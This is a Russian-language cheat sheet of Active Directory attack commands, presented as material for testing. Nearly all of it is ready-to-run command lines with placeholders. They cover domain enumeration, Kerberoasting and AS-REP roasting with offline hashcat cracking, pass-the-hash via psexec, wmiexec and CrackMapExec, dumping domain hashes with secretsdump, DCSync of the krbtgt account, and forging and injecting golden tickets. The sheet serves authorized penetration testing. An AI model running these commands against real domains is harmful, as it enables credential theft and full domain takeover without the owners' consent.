# Перечисление и атаки на учетные данные

Команды для тестирования Active Directory: перечисление ресурсов домена, Kerberoasting, AS-REP roasting, передача хэша (Pass-the-Hash), DCSync, а также использование поддельных или повторно использованных тикетов.

## Active Directory и Kerberos — Шпаргалка

**Что такое Active Directory?**

Active Directory — это платформа управления идентификацией и политиками Microsoft для доменов Windows. Ее тикеты Kerberos, разрешения каталога и отношения доверия создают векторы, которые можно проанализировать и оценить, получив первоначальный доступ (плацдарм) в домене.

Замените `domain.com`, примеры идентификаторов, `192.0.2.20` и значения хэшей или тикетов в верхнем регистре на соответствующие данные вашего домена. Примеры с Impacket предполагают, что указанные скрипты доступны локально; команды Rubeus и Mimikatz выполняются из каталога с их исполняемыми файлами. Анонимные поисковые запросы LDAP могут быть запрещены, а для командлетов AD PowerShell требуется модуль ActiveDirectory. Репликация, имперсонация тикетов и удаленное выполнение команд требуют соответствующих разрешений учетной записи и правильной конфигурации целевой системы.

Перечислить всех пользователей домена

```
net user /domain
```

List Domain Admins group members

```
net group "Domain Admins" /domain
```

List domain controllers

```
nltest /dclist:<domain>
```

PowerShell: enumerate all AD users

```
Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Enabled
```

PowerShell: Domain Admins members

```
Get-ADGroupMember "Domain Admins" | Select Name,SamAccountName
```

LDAP enumeration of users

```
ldapsearch -H ldap://<DC_IP> -x -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
```

BloodHound collection

```
bloodhound-python -u user -p pass -d domain.com -c All --zip
```

If the command above fails, specify the domain controller and DNS server explicitly. Replace `DC01.domain.com` and `<DC_IP>` with your domain controller's hostname and IP address.

BloodHound collection: explicit DC and DNS

```
bloodhound-python -u 'user' -p 'password' -d domain.com -dc DC01.domain.com -ns <DC_IP> -c All --zip
```

impacket: get TGS hashes

```
python3 GetUserSPNs.py domain.com/user:password -dc-ip <DC_IP> -request
```

Windows: Kerberoast all SPNs

```
Rubeus.exe kerberoast /outfile:hashes.txt
```

Crack TGS-REP hashes offline

```
hashcat -m 13100 -a 0 hashes.txt rockyou.txt
```

Get AS-REP for accounts with no pre-auth

```
python3 GetNPUsers.py domain.com/ -dc-ip <DC_IP> -usersfile users.txt -no-pass
```

Windows AS-REP roasting

```
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

Crack AS-REP hashes

```
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt
```

impacket: PtH with psexec

```
python3 psexec.py -hashes :NTLM_HASH domain/user@target
```

CrackMapExec: PtH SMB
```
crackmapexec smb target -u user -H NTLM_HASH
```

impacket: PtH WMI exec

```
python3 wmiexec.py -hashes :NTLM_HASH domain/user@target
```

Dump all domain hashes

```
python3 secretsdump.py domain/user:pass@<DC_IP>
```

DCSync for KRBTGT hash

```
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
```

Create + inject golden ticket

```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:<SID> /krbtgt:<NTLM> /ptt
```

Inject existing ticket

```
mimikatz # kerberos::ptt ticket.kirbi
```

Inject ticket into current session

```
Rubeus.exe ptt /ticket:<base64_ticket>
```

Get service ticket
```
python3 getST.py -spn cifs/<target> -impersonate Administrator domain.com/user:pass
```
